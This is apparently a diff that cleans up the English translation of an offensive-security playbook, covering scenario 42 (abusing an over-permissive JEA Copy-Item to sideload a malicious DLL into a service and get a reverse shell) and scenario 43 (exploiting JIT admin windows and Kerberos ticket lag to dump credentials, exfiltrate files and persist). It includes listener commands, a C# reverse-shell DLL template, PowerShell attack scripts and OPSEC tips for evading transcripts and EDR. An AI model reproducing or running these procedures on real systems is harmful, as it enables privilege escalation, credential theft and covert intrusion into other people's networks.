-- per channel**Just try it once**：Trial and error will result in shell/EDR Leaves a lot of suspicious interactions; try dialog classes with no process behavior first。
-- Try not to fall into the market before the rebound; give priority to the memory channel after the breakthrough（PowerShell reflection / `Add-Type` memory loading）。
-- Kiosk Always use screen recording/For monitoring, the operation must be fast, and the commands must be written in advance and pasted and executed at once.。
-- Keep a check-box record: make it clear in the report"Which channels are open, which ones are blocked, and how to reproduce them?"。
+- **Try each channel once**: repeated probing leaves a lot of suspicious interaction in the shell/EDR; prefer the dialog-type channels with no process behavior.
+- Avoid touching disk before the callback; after the breakout prefer memory-only channels (PowerShell reflection / `Add-Type` in-memory loading).
+- Kiosks often have screen recording/monitoring, so work fast and pre-write the commands to paste and run in one go.
+- Keep the tick list: the report must state which channels worked, which were blocked, and how to reproduce them.
 ````
 
-## Scenario 42 · JEA over-wide file copy + service loading trigger
+## Scenario 42 · JEA over-permissive file copy + service load trigger
 
 ### Situation
-Exists in domain PowerShell restricted endpoint（JEA，Use when logging in `-ConfigurationName` Specify session configuration, such as `BackupMaintenance`）。The low-privilege account we control is a JEA Members of a role, abilities of that role（Role Capability）**too wide**：allow `Copy-Item` and `-Destination` Not restricted to security directories (can write to service directories, etc.), or additionally allowed access to specified services `Restart-Service`。The capability whitelist does not include any command execution, so it cannot be directly JEA Run code in session. Attack idea: use file copy to remove malicious DLL put in**Serve/The daemon will be loaded from this directory DLL**location (within the directory“Missing dependencies DLL”or plugin DLL），Trigger the load again and let the code execute in the context of the service account。
+The domain has a restricted PowerShell endpoint (JEA; at logon you select the session configuration with `-ConfigurationName`, for example `BackupMaintenance`). The low-privilege account we control is a member of a JEA role, and that role's capability is **too broad**: it allows `Copy-Item` with `-Destination` not restricted to safe directories (so you can write into service directories and similar), or it additionally allows `Restart-Service` on a chosen service. The capability allow-list contains no arbitrary command execution, so you cannot run code directly in the JEA session. Attack idea: use the file copy to place a malicious DLL where a **service/daemon will load a DLL from that directory** (a "missing dependency DLL" in the directory, or a plug-in DLL), then trigger the load so the code runs in the service account's context.
 
 ### Assumptions
-- Know JEA The endpoint name, and our account has endpoint permissions（Permission）Allowed members (available `Get-PSSessionConfiguration` or from memory/Social worker gets endpoint name）。
-- exist“Directories can be copied and writable by files + The service will be loaded from this directory DLL”Target: The most common is the installation directory of a third-party service（DLL Search for sequential sideloading) or service plugins/module directory。
-- There is at least one triggering method: the role allows `Restart-Service`/`Stop-Service`+`Start-Service`；Or the service will automatically restart periodically; or the administrator will restart the service manually.。
-- JEA Session with virtual account/The hosting service account is running, and the disk placement is subject to the permissions of the account - it is possible to write to the service directory without permission.“Too much ability”manifestation。
+- You know the JEA endpoint name, and our account is a member allowed by the endpoint's permission (you can get the endpoint name with `Get-PSSessionConfiguration`, or from memory/social engineering).
+- A suitable target exists: a directory that file copy can write to, plus a service that loads a DLL from that directory. The most common case is a third-party service's install directory (DLL search-order sideloading) or the service's plug-in/module directory.
+- At least one trigger is available: the role allows `Restart-Service`/`Stop-Service`+`Start-Service`; or the service restarts automatically on a schedule; or an administrator restarts that service by hand.
+- The JEA session runs as a virtual account or managed service account, so writing to disk is bounded by that account's rights - being able to write into the service directory is exactly what "capability too broad" looks like.
 
-### Prepare (attacker)
-- Prepare to be malicious DLL：`m14-jea-service-dll.cs`（Or use it instead according to the missing dependency type of the target. M04 of C Native DLL template）。
-- Start monitoring：`nc -lvnp LPORT`；confirm `LHOST` right `TARGET` of 5985/5986 Reachable。
-- Try to understand the target service first exe The actual missing dependency name and architecture（x64/x86）——side loading DLL of**Filename and architecture must match host**。
+### Prepare (attacker side)
+- Prepare the malicious DLL: `m14-jea-service-dll.cs` (or switch to the native C DLL template from M04, depending on the kind of dependency the target is missing).
+- Start a listener: `nc -lvnp LPORT`; confirm `LHOST` can reach `TARGET` on 5985/5986.
+- Try to establish the target service exe's real missing dependency name and its architecture (x64/x86) first - a sideloaded DLL's **file name and architecture must match the host**.
 
 ### Procedure
-1. **Discovery endpoint**（from other machines/When credentials are enumerated）：
+1. **Discover the endpoint** (when you can enumerate it from another machine or with other credentials):
    `Get-PSSessionConfiguration | Select-Object Name, Permission`
-2. **Construct credentials and connect JEA endpoint**：
-   `$cred = Get-Credential DOMAIN\USER`；`Enter-PSSession -ComputerName TARGET -ConfigurationName <JEA-endpoint> -Credential $cred`
-   （NTHASH When there is no clear text，WinRM Direct connection does not support hashing, use instead `m15` of evil-winrm/PowerShell Hash login template; or first put NTHASH Exchange tickets。）
-3. **Enumerate available commands within a session**：`Get-Command | Select-Object Name, Source`——JEA Unallowed commands will be hidden，**What you can see is what you can use**。confirm `Copy-Item` in the column；`Restart-Service`/`Test-Path` Whether to be listed determines the triggering and verification strategies。
-4. **Exploring boundaries (harmless files）**：`Copy-Item C:\Windows\Temp\probe.txt -Destination <candidate-dir>\m14probe.txt`。success/The error message is used to determine whether the directory is within the replication capability (report Access Denied/Path is excluded → Change directory）。
-5. **Identify target services and DLL name**：If you can list services（`Get-Service` If it is in the whitelist, list it directly); otherwise, it will be judged based on the known software of the target machine. Main points：**The name of the delivery file must be a dependency that is missing from the host or the name of a plug-in that will be loaded.**，Architecture matching。
-6. **throw malicious DLL**：`Copy-Item \\LHOST\share\evil.dll -Destination "<service-dir>\<missing-dep-name>.dll" -Force`（First put the original DLL The backup copy is kept on the attacking machine side to facilitate subsequent recovery.）。
-7. **trigger loading**：
-   - role allowed：`Restart-Service <service-name>`（First `Stop-Service` Again `Start-Service` Give it a try. If you have the ability, you can only release one of them.）。
-   - Service control not allowed: Wait for the service to automatically restart/Administrator operation, monitoring remains online, persistence is prepared in advance。
-8. **Recycling and Cleanup**：shell After connecting back `whoami` Should be a service account; check the monitoring log and DLL Restore overwritten files on demand after behavior。
+2. **Build credentials and connect to the JEA endpoint**:
+   `$cred = Get-Credential DOMAIN\USER`; `Enter-PSSession -ComputerName TARGET -ConfigurationName <JEA-endpoint> -Credential $cred`
+   (With only an NTHASH and no cleartext, a direct WinRM connection cannot use the hash - switch to the evil-winrm/PowerShell hash logon templates from `m15`, or convert the NTHASH into a ticket first.)
+3. **Enumerate the commands available inside the session**: `Get-Command | Select-Object Name, Source` - JEA hides everything that is not allowed, so **what you can see is what you can use**. Confirm `Copy-Item` is in the list; whether `Restart-Service`/`Test-Path` are listed decides your trigger and validation strategy.
+4. **Probe the boundary (harmless file)**: `Copy-Item C:\Windows\Temp\probe.txt -Destination <candidate-dir>\m14probe.txt`. The success or the error message tells you whether that directory is inside the copy capability (Access Denied/a path that is excluded → pick another directory).
+5. **Identify the target service and DLL name**: if you can list services (`Get-Service`, when it is on the allow-list) do that directly; otherwise reason from the software you know is on the target. Key point: **the file name you drop must be a dependency the host is missing, or a plug-in name the host will load**, and the architecture must match.
+6. **Drop the malicious DLL**: `Copy-Item \\LHOST\share\evil.dll -Destination "<service-dir>\<missing-dep-name>.dll" -Force` (keep a backup copy of the original DLL on the attacker machine first, so you can restore it afterwards).
+7. **Trigger the load**:
+   - The role allows it: `Restart-Service <service-name>` (also try `Stop-Service` then `Start-Service`; some capabilities allow only one of the two).
+   - No service control allowed: wait for the service to restart itself or for an administrator to act; keep the listener up and have persistence prepared in advance.
+8. **Collect and clean up**: after the shell calls back, `whoami` should be the service account; check the listener log and the DLL's behavior, then restore any overwritten files as needed.
 
 ### Scripts used
-- `m14-jea-file-copy.ps1`：Automated Section from Attack Aircraft 2、4、6、7 Step (Construct Credentials → Enter JEA session → enumeration command → Harmless exploration of boundaries → Place → trigger), output the result at each step。
-- `m14-jea-service-dll.cs`：was placed DLL Load template (load and connect back/Two modes for executing commands, including compilation route instructions）。
+- `m14-jea-file-copy.ps1`: automates steps 2, 4, 6 and 7 from the attacker machine (build credentials → enter the JEA session → enumerate commands → harmless boundary probe → drop the payload → trigger), printing the result of each step.
+- `m14-jea-service-dll.cs`: the DLL payload template that gets dropped (two modes: call back on load, or execute a command, with compilation route notes).
 
 ### Validation
-- within session `Get-Command` can see `Copy-Item` Waiting for whitelist command → Endpoints are reachable and capabilities are in line with expectations。
-- The pathfinding file is indeed written to the target directory (if allowed within the session `Test-Path` Check directly; otherwise, use the second step Copy-Item Overwrite the file with the same name to see if it reports“Already exists/occupied”indirect judgment）。
-- After triggering, the listener receives the connection back，`whoami` for service account → End-to-end success。
+- Inside the session, `Get-Command` shows `Copy-Item` and the other allow-listed commands → the endpoint is reachable and the capability matches expectations.
+- The probe file really was written to the target directory (validate directly with `Test-Path` inside the session if it is allowed; otherwise copy over a file of the same name with a second `Copy-Item` and read the "already exists/in use" error as an indirect signal).
+- After the trigger the listener receives a callback and `whoami` is the service account → end-to-end success.
 
 ### Failure branches and alternatives
-- **`-Destination` actually restricted**（Report an error/Excluded): Trying to read character ability file location allowed path——`C:\Program Files\WindowsPowerShell\Modules\<module>\<role-capability>\*.psrc` of `FileSystem` paragraph (if it can be read); or resubmit“shared root directory + The target service treats the share as a module/Configuration directory loading”combination。
-- **The service is not loaded and put in DLL**（Guess the name or dependency incorrectly): Use it on the attack machine first dumpbin/ProcMon Idea confirmation service exe Which import table is missing? DLL；none ProcMon Check for software of the same version“Known to be sideloadable DLL name”List (such as `version.dll`、`winmm.dll` kind）。
-- **There are no service control commands and the service will not restart automatically.**：File copy capability can change trigger objects - login scripts and scheduled task scripts that overwrite writable locations、`Startup` Shortcuts, configuration files that are executed periodically,“Service trigger”Change to“event trigger”（User login/Scheduled tasks）。
-- **The service context is NetworkService/LocalService rather than SYSTEM**：Accept this context to do horizontal, or change it to SYSTEM Running service target。
+- **`-Destination` is in fact restricted** (error/excluded): try to read the role capability file to locate the allowed paths - the `FileSystem` section of `C:\Program Files\WindowsPowerShell\Modules\<module>\<role-capability>\*.psrc` (if you can read it); or switch to a combination where you write into a share root and the target service treats that share as a module/configuration directory.
+- **The service does not load the DLL you placed** (wrong name or wrong dependency): first confirm on the attacker machine which DLL the service exe's import table is missing, using the dumpbin/ProcMon approach; without ProcMon, consult the "known sideloadable DLL names" list for that software version (things like `version.dll`, `winmm.dll`).
+- **There is no service-control command and the service never restarts on its own**: reuse the file-copy capability against a different trigger object - a logon script in a writable location, a scheduled-task script, a `Startup` shortcut, a configuration file that gets executed periodically - turning a "service trigger" into an "event trigger" (user logon/scheduled task).
+- **The service context is NetworkService/LocalService rather than SYSTEM**: accept that context for lateral movement, or pick a different service target that runs as SYSTEM.
 
 ### Exam / OPSEC notes
-- JEA Endpoints are usually mandatory **Transcript**，All commands within the session will be recorded: sensitive actions should be included as much as possible DLL internal finish，JEA Only keep in the conversation `Copy-Item`/`Restart-Service` This type“fit the role”Operation。
-- Pathfinding uses harmless files and file names close to business habits; formal DLL Naming the dependencies that are missing from the host can greatly reduce suspicion.。
-- Triggering service restart may cause business interruption: Prioritize non-critical options/Copy service; record the original status of the service before triggering, and restore it at the end。
-- DLL The return address in `LHOST` before launch**Confirm last time**——Once released, it cannot be modified.。
+- JEA endpoints usually enforce a **transcript**, so every command in the session is recorded: keep sensitive actions inside the DLL and leave only role-appropriate operations such as `Copy-Item`/`Restart-Service` in the JEA session.
+- Use harmless files for probing and file names that fit normal business naming; naming the real DLL exactly like the dependency the host is missing greatly reduces suspicion.
+- Restarting a service can disrupt business: prefer a non-critical or replica service; record the service's original state before triggering and restore it at the end.
+- Confirm the callback address `LHOST` inside the DLL **one last time** before delivery - once it is out there you cannot change it.
 
 ---
 
@@ -333,7 +333,7 @@ Exists in domain PowerShell restricted endpoint（JEA，Use when logging in `-Co
 // Usage: 
 // # InstallUtil trigger (if Restart-Service is allowed in the JEA session, the target service can also be triggered by restarting it)
 //   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U m14-jea-service-dll.dll
-// # Side-loading trigger: DLL named as the host’s missing dependency name (such as version.dll) is placed in the service directory and restarts the service.
+// # Side-loading trigger: name the DLL after the dependency the host is missing (for example version.dll), place it in the service directory and restart the service.
 //   copy m14-jea-service-dll.dll "C:\Program Files\TargetSvc\version.dll" /Y
 //   sc stop TargetSvc && sc start TargetSvc
 // Placeholders: LHOST=attack machine IP, LPORT=listening port (reconnection mode; automatically skip reconnection when not replaced and only do mark writing)
@@ -423,7 +423,7 @@ namespace M14Jea
             File.WriteAllText(MarkerPath, body, Encoding.UTF8);
         }
 
-        // Action ②: Optional backlink (need to replace LHOST/LPORT with real values ​​first)
+        // Action ②: optional callback (replace LHOST/LPORT with real values first; the callback is skipped automatically when they are not replaced)
         private static void ReverseShell(string host, int port)
         {
             TcpClient client = new TcpClient();
@@ -587,35 +587,35 @@ namespace M14Jea
 
 ````powershell
 <#
-use: automation“JEA Over-wide file copy”Utilize - Connect JEA Restricted endpoints, enumeration of available commands, harmless exploration of boundaries、
-      throw malicious DLL Go to the service loading directory and try to use Restart-Service trigger loading。
-scene: scene 42（docs/14-kiosk-jea-jit.md）。Character abilities are too broad: allowed Copy-Item and -Destination
-      Undefined security directory; this script does not rely on sessions to execute arbitrary code。
-rely: attack aircraft PowerShell 5.1+；target open WinRM 5985/5986；JEA endpoint Permission Including this account；
-      be placed DLL See m14-jea-service-dll.cs（or M04 Native C template）。
-use:
+Purpose: automate the "JEA over-permissive file copy" exploit - connect to the restricted JEA endpoint, enumerate the available commands, harmlessly probe the boundary,
+      drop a malicious DLL into a service load directory, and try to trigger the load with Restart-Service.
+Scenario: scenario 42 (docs/14-kiosk-jea-jit.md). The role capability is too broad: it allows Copy-Item and -Destination
+      is not restricted to safe directories; this script does not rely on executing arbitrary code inside the session.
+Requires: PowerShell 5.1+ on the attacker machine; WinRM 5985/5986 open on the target; a JEA endpoint whose Permission includes this account;
+      the DLL that gets dropped is in m14-jea-service-dll.cs (or the M04 native C template).
+Usage:
   .\m14-jea-file-copy.ps1 -Target TARGET -Endpoint <JEAendpoint name> -Domain DOMAIN -User USER `
       -Pass 'PASS' -LocalPayload .\evil.dll -RemoteDir 'C:\Program Files\<Vendor>' `
       -RemoteName 'version.dll' -ServiceName '<svc>' [-ForceRestart] [-ProbeOnly]
-  illustrate: -ProbeOnly Just do“enumeration command + Write harmless probes”Two things, no official payload is released, used to confirm the boundary。
-       NTHASH Login does not support native WinRM Direct connection, see you -NTHash Parameter description。
-placeholder: LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD —— All passed in as command line parameters。
-test status: Not tested (depends on target environment) JEA Configuration; as per document section 42 festival first -ProbeOnly lower validation bound）。
+  Notes: -ProbeOnly only does two things - "enumerate the commands + write a harmless probe" - and does not drop the real payload; use it to confirm the boundary.
+       NTHASH logon is not supported over a direct native WinRM connection; see the -NTHash parameter notes.
+Placeholders: LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD - all passed in as command-line parameters.
+Test status: not tested (depends on the target's JEA configuration; per section 42 of the doc, verify the boundary under -ProbeOnly first).
 #>
 [CmdletBinding()]
 param(
-    [Parameter(Mandatory)][string]$Target,      # Target machine name/IP（TARGET）
-    [Parameter(Mandatory)][string]$Endpoint,    # JEA Session configuration name, such as BackupMaintenance
-    [Parameter(Mandatory)][string]$Domain,      # domain name（DOMAIN）
-    [Parameter(Mandatory)][string]$User,        # JEA role member account（USER）
-    [string]$Pass,                              # clear text password（PASS），and -NTHash Choose one
-    [string]$NTHash,                            # NTHASH：For reminder only（WinRM Direct hash login is not supported）
-    [string]$LocalPayload,                      # local malicious DLL path（PAYLOAD）
-    [string]$RemoteDir,                         # Target delivery directory (service exe/Plug-in directory）
-    [string]$RemoteName,                        # The file name after delivery (the host’s missing dependency name）
-    [string]$ServiceName,                       # Service name that triggers restart
-    [switch]$ForceRestart,                      # Called after delivery Restart-Service
-    [switch]$ProbeOnly                          # Only explore the boundaries and do not release formal payloads
+    [Parameter(Mandatory)][string]$Target,      # target host name/IP (TARGET)
+    [Parameter(Mandatory)][string]$Endpoint,    # JEA session configuration name, such as BackupMaintenance
+    [Parameter(Mandatory)][string]$Domain,      # domain name (DOMAIN)
+    [Parameter(Mandatory)][string]$User,        # JEA role member account (USER)
+    [string]$Pass,                              # cleartext password (PASS); mutually exclusive with -NTHash
+    [string]$NTHash,                            # NTHASH: informational only (WinRM does not support direct hash logon)
+    [string]$LocalPayload,                      # local malicious DLL path (PAYLOAD)
+    [string]$RemoteDir,                         # target delivery directory (service exe/plug-in directory)
+    [string]$RemoteName,                        # file name after delivery (the dependency name the host is missing)
+    [string]$ServiceName,                       # service to restart as the trigger
+    [switch]$ForceRestart,                      # call Restart-Service after delivery
+    [switch]$ProbeOnly                          # probe the boundary only; do not drop the real payload
 )
 
 $ErrorActionPreference = 'Stop'
@@ -753,77 +753,77 @@ Write-Step "Finish. If the DLL is reconnected successfully, please check whoami 
 Remove-PSSession $session
 ````
 
-## Scenario 43 · JIT time window (authorization status/token refresh time difference/established commands within the window)
+## Scenario 43 · JIT time window (authorization state / token refresh lag / planned commands inside the window)
 
 ### Situation
-Environment enforcement of administrator privileges Just-In-Time（JIT）：Usually high-power groups (such as domain groups `JIT-Admins`，or the local administrator group of the target machine)**No**Target account; the administrator temporarily adds the account to the group when needed, and automatically removes it after a few minutes to dozens of minutes. We hold credentials for a low-privilege account and the account may be JIT Authorize (or be able to take over an account that will be authorized). Task: exploit**time window**Get high-power results. The core is three points：① Can check the authorization status (when to enter the window/Go out the window）；② Understanding Token Refresh Time Differences（“Group was added”≠“Existing sessions take effect immediately”，on the contrary“Group removed”≠“The issued ticket becomes invalid immediately”）；③ Put what is to be executed in the window**High-power orders are pre-programmed**，Run away as soon as you enter the window, don't think on the spot。
+The environment applies just-in-time (JIT) admin rights: normally the privileged group (for example the domain group `JIT-Admins`, or the target's local Administrators group) does **not** contain the target account; when an administrator needs it, the account is added temporarily and removed again minutes to tens of minutes later. We hold credentials for a low-privilege account that may be JIT-authorized (or we can take over an account that will be authorized). Task: use the **time window** to obtain a privileged result. Three things matter: ① you can query the authorization state (when the window opens and closes); ② you understand the token refresh lag ("the group was added" does not mean "the existing session takes effect immediately", and conversely "the group was removed" does not mean "issued tickets stop working at once"); ③ the **privileged commands to run inside the window are planned in advance**, so they run the moment the window opens - you cannot improvise on site.
 
 ### Assumptions
-- Holding will be JIT Authorized low-privilege account credentials; may be able to take over first JIT Authorization target account。
-- at least one“Look out the window”Access: able to read AD（LDAP Group member query), readable domain control/Native security log（4728/4729：Group members increase/delete), or the environment document states JIT Activation rules and duration。
-- Kerberos Main authentication：TGT/Service tickets have a life cycle，**Group SID Only enter tickets with the time of issuance**——This is the root reason why the time difference can be exploited。
-- The attack machine and domain control time have been synchronized（Kerberos Hard requirements）。
+- You hold credentials for a low-privilege account that will be JIT-authorized, or you can take over the account that gets authorized first.
+- At least one way to "watch the window": you can read AD (LDAP group membership queries), or read the domain controller/local security log (4728/4729: member added/removed), or the environment documentation states the JIT activation rule and duration.
+- Kerberos is the primary authentication: TGTs and service tickets have a lifetime, and **the group SIDs are only baked into the ticket issued at that moment** - that is the root cause that makes the lag exploitable.
+- The attacker machine and the domain controller have synchronized clocks (a hard Kerberos requirement).
 
-### Prepare (attacker)
-- Pre-arrange the list of commands in the window and arrange them in order (see execution steps 4），Because the window may only be a few minutes。
-- Prepare for monitoring and persistence that needs to be implemented/Fetch script。
-- Record JIT Expected window start and end and polling starting point for easy backtracking。
+### Prepare (attacker side)
+- Pre-plan the in-window command list and put it in order (see Procedure step 4), because the window may only be a few minutes long.
+- Prepare the listener plus any persistence or collection scripts you need on disk.
+- Record the expected JIT window start/end and your polling start point, so you can reconstruct it later.
 
 ### Procedure
-1. **Sure“Authorization status”Query method**（Parallel if possible）：
-   - AD Group members (most commonly used, readable by users in any domain)）：`Get-ADGroupMember -Identity 'JIT-Admins' -Server DC` Polling; None AD Used when using modules ADSI（See script implementation）。
-   - Event Log: Domain Controller Security Log Events **4728**（Member joins global group）/ **4729**（Remove), filter the target account SID。
-   - local machine JIT（Temporarily join the local administrator group): poll on the controlled host `net localgroup Administrators`。
-2. **Understand and test“Token refresh time difference”**：
-   - **Window side**：Old session that existed before the window/The old token does not contain the newly added group SID（`whoami /groups` cannot be seen) - required**Get new token in window**：Log in again、`runas`、New PSSession（Trigger new network login → new TGT with current group SID）、or `klist purge` Get the ticket again。
-   - **Window side**：Issued within the window Kerberos Ticket lifecycle (default TGT 10h，The longest renewable period 7 sky）**Longer than group membership**——After the group is removed, the high authority in the ticket SID Remains valid until ticket expires/revoked. Renew（renew）Only extend the time, do not change SID gather。
-3. **Deployment window monitoring**：Background polling authorization status（`m14-jit-admin-window.ps1`）。Immediately after detecting a window entry：
-   a. Get new token (new PSSession / runas / Reauthenticate to target machine）；
-   b. Verify that the new token contains the high-privilege group: within the session `whoami /groups | findstr JIT`；
-   c. Execute the preset command list sequentially。
-4. **List of established commands in the window**（Pre-arrange in order and keep each item as short as possible）：
-   1) Grab this machine/Domain high authority credentials and return（Invoke-Mimikatz Wait, see you M07）——As a result, the attack aircraft will be dropped. You can continue to use it after exiting the window.；
-   2) Reading files that require high privileges/Configuration (scripts, backups, registry) and export；
-   3) （Optional, put last) Build persistence: scheduled tasks/Serve/Add our accounts to the long-term group - actions that change the environment are individually identified and audit risk assessed。
-   in principle：**Get results first and then talk about persistence**；receipt received/Hash/The remote session is“Can continue to be used behind the window”assets。
-5. **Utilization after the window ends**：After polling finds that the member has been removed (out of the window), verify the remaining session/Does the bill still carry high authority? SID（Existing PSSession The token is a login snapshot and theoretically still contains the group); horizontal is completed during the ticket life cycle and does not rely on group membership itself。
+1. **Decide how you will query the "authorization state"** (run these in parallel where possible):
+   - AD group membership (the most common, readable by any domain user): poll `Get-ADGroupMember -Identity 'JIT-Admins' -Server DC`; without the AD module use ADSI (see the script implementation).
+   - Event log: domain controller security log events **4728** (member added to a global group) / **4729** (removed); filter on the target account's SID.
+   - Local JIT (temporary membership of the local Administrators group): poll `net localgroup Administrators` on the controlled host.
+2. **Understand and actually measure the "token refresh lag"**:
+   - **On the way in**: an old session or token that existed before the window does not contain the newly added group SID (`whoami /groups` will not show it) - you must **obtain a new token inside the window**: log on again, `runas`, open a new PSSession (which triggers a new network logon → a new TGT carrying the current group SIDs), or `klist purge` and then re-acquire tickets.
+   - **On the way out**: a Kerberos ticket issued inside the window has a lifetime (default TGT 10h, renewable up to 7 days) **longer than the group membership** - after the group is removed, the privileged SID in the ticket stays valid until the ticket expires or is revoked. Renewal only extends the time; it does not change the SID set.
+3. **Deploy window monitoring**: poll the authorization state in the background (`m14-jit-admin-window.ps1`). The moment it detects the window opening:
+   a. obtain a new token (new PSSession / runas / re-authenticate to the target machine);
+   b. verify the new token contains the privileged group: `whoami /groups | findstr JIT` inside the session;
+   c. run the pre-planned command list in order.
+4. **The planned command list for inside the window** (pre-ordered, each entry as short as possible):
+   1) Collect local/domain privileged credentials and send them back (Invoke-Mimikatz and similar; see M07) - the results land on the attacker machine and stay usable after the window closes;
+   2) Read files and configuration that need high privilege (scripts, backups, the registry) and exfiltrate them;
+   3) (Optional, put last) Build persistence: a scheduled task/service, or adding our account to a long-lived group - actions that change the environment need separate confirmation and an audit-risk assessment.
+   Principle: **get results first, talk persistence later**; any ticket/hash/remote session you obtain is an asset that keeps working after the window.
+5. **Exploitation after the window closes**: once polling shows the membership removed (window closed), verify whether the residual session/ticket still carries the privileged SID (an existing PSSession's token is a logon snapshot and should still contain the group); finish your lateral movement within the ticket lifetime instead of relying on the group membership itself.
 
 ### Scripts used
-- `m14-jit-admin-window.ps1`：Poll authorization status（ADSI Group member query is mainly for local groups/Event log mode optional）→ Enter the window and get a new token → Execute preset command list → Record exit time and check remaining token status。
+- `m14-jit-admin-window.ps1`: polls the authorization state (ADSI group membership queries by default, with optional local-group/event-log modes) → grabs a new token as soon as the window opens → runs the pre-planned command list → records the window-close time and checks the residual token state.
 
 ### Validation
-- The script log sequence is complete: detecting window entry → The new token contains JIT Group → The command list is successful one by one → detection window → Residual token check results。
-- Three-state authentication: new token in window `whoami /groups` Contains high-privilege groups; old process tokens outside the window do not include; those created within the window PSSession Still available after exiting the window (login snapshot）。
-- Manifest artifact (hash file/Fetch results/ticket file) is confirmed to exist on the attacking machine side。
+- The script log reads in the right order: window entry detected → new token contains the JIT group → every command in the list succeeds → window exit detected → residual token check result.
+- Three-state validation: inside the window the new token's `whoami /groups` contains the privileged group; outside the window an old process token does not; a PSSession established inside the window still works after it closes (logon snapshot).
+- The list's artifacts (hash files/collected output/ticket files) are confirmed present on the attacker machine.
 
 ### Failure branches and alternatives
-- **Unable to read group members/event log**：According to the environment document JIT Stay in advance during the activation time, and frequently try to get new tokens near the starting point of the window and use them `whoami /groups` Verify (the starting point of the exhaustive window); or observe the time when the administrator triggers the authorization behavior pattern to infer。
-- **The authorized object is not an account controlled by us**：Take over first/Reuse JIT Authorize the account (credentials, session, token), and then return to this process。
-- **The remaining tickets will become invalid immediately after exiting the window.**（JIT With short TGT or forced logout): use it after giving up the window, and concentrate the output within the window (reconnect/Drop-in priority）。
-- **The high-power group is only interested in“New interactive login”It takes effect but the environment prohibits multiple sessions./runas**：Use within window S4U Apply for a service ticket directly（Rubeus `s4u`/`asktgt` idea), bypass interactive login restrictions, and use high-level SID Solidify into available tickets。
+- **Group membership/event log unreadable**: camp on the JIT activation time from the environment documentation and, around the expected window start, try obtaining a new token at high frequency and validate it with `whoami /groups` (brute-forcing the window start); or observe the administrator's pattern when they trigger authorization to infer the time.
+- **The authorized object is not an account we control**: take over/reuse the JIT-authorized account first (credentials, session, token), then return to this flow.
+- **Residual tickets die immediately after the window closes** (JIT configured with a short TGT or forced logoff): give up on post-window use and concentrate your output inside the window (callback/exfiltration first).
+- **The privileged group only takes effect for a "new interactive logon", but the environment forbids multiple sessions/runas**: inside the window use S4U to request a service ticket directly (the Rubeus `s4u`/`asktgt` approach) to bypass the interactive-logon restriction and bake the privileged SID into a usable ticket.
 
 ### Exam / OPSEC notes
-- Authorization status polling is a low-risk read operation, but high-frequency polling leaves a large amount of LDAP Query log:interval ≥5–10s，Encrypt frequencies only before and after the expected window。
-- Event log query（4728/4729）Try to only check the domain controller, do not scan multiple machines horizontally。
-- Grab credentials in window/The creation of persistence will be credited JIT Session auditing: Prioritize doing it within the window“get the result”（Grab the hash/external files), minimize persistence actions and put them at the end。
-- Do not use the remaining bills until one second before expiration (renewal fails/It is difficult to clean up on site after being revoked); once it is verified that it is feasible, it will be transferred to formal use and put into storage as soon as possible.。
+- Polling the authorization state is a low-risk read, but high-frequency polling leaves a lot of LDAP query logs: keep the interval at ≥5-10s and only increase the rate around the expected window.
+- For event log queries (4728/4729), query the domain controller only; do not sweep multiple machines.
+- Collecting credentials/building persistence inside the window is recorded in the JIT session audit: prioritize "getting results" (dumping hashes, exfiltrating files) inside the window, keep environment-changing actions to a minimum and put them last.
+- Do not run residual tickets right up to the second before they expire (a failed renewal or a revocation is hard to clean up on site); once you have validated that it works, move to real exploitation and get the loot out quickly.
 
 #### `m14-jit-admin-window.ps1` {#m14-jit-admin-window-ps1}
 
 ````powershell
 <#
-use：JIT Temporary administrator window combat script-query authorization status（AD group member + current token group), refresh tickets（klist purge / gpupdate）、
-      After entering the window, execute according to the countdown window sequence."Pre-programmed list of established commands"，And after the window ends, check whether the residual token still has high authority SID。
-scene：43（JIT Temporary administrator rights are approved, but are valid for a short period of time）
-rely：Windows PowerShell 3.0+；Readable within the domain LDAP（389）or available Get-ADGroupMember；gpupdate / klist（The system comes with）
-use：
+Purpose: combat script for a temporary JIT admin window - query the authorization state (AD group membership + the current token's groups), refresh tickets (klist purge / gpupdate),
+      run the "pre-planned command list" in order inside the countdown window, and when the window closes check whether the residual token still carries the privileged SID.
+Scenario: 43 (temporary JIT admin rights are approved, but stay valid for only a short time)
+Requires: Windows PowerShell 3.0+; readable LDAP (389) in the domain or Get-ADGroupMember available; gpupdate / klist (built into Windows)
+Usage:
   powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Status
   powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Status -Domain DOMAIN -User USER -Group 'JIT-Admins'
   powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Refresh
   powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Wait -WindowSec 900 -PollSeconds 10
   powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Run -CommandFile C:\Users\public\jit-cmds.txt -WindowSec 300
-placeholder：DOMAIN=AD domain name；USER=will be JIT Authorized account；TARGET=target machine；PAYLOAD=Defined command list file (one command per line）
-Test status: Not available Windows actual measurement; press PowerShell 3.0+ Syntax writing (available Get-Help .\m14-jit-admin-window.ps1 -Full View instructions）
+Placeholders: DOMAIN=AD domain name; USER=the account that will be JIT-authorized; TARGET=target machine; PAYLOAD=the planned command list file (one command per line)
+Test status: not measured on Windows; written for PowerShell 3.0+ syntax (use Get-Help .\m14-jit-admin-window.ps1 -Full for the instructions)
 #>
 [CmdletBinding()]
 param(
@@ -1026,17 +1026,17 @@ function Start-JitWait {
 
 if ($Help) {
     Write-Output @'
-usage: powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode <Status|Refresh|Wait|Run> [parameter]
+Usage: powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode <Status|Refresh|Wait|Run> [parameters]
 
-  -Mode Status    Query authorization status：AD Group members and whether the current token contains a high-rights group、klist Tickets, security logs 4728/4729
-  -Mode Refresh   Refresh authentication status：klist purge -> gpupdate /force -> Create a new login to get a new token -> Review
-  -Mode Wait      Polling and waiting window（-DeadlineSec），Enter the window to refresh the ticket and execute it. -CommandFile、Countdown and check remaining tokens
-  -Mode Run       Considered to be within the window: refresh directly -> Review -> exist -WindowSec Execute the set command list within seconds
+  -Mode Status    query the authorization state: AD group membership, whether the current token contains the privileged group, klist tickets, security log 4728/4729
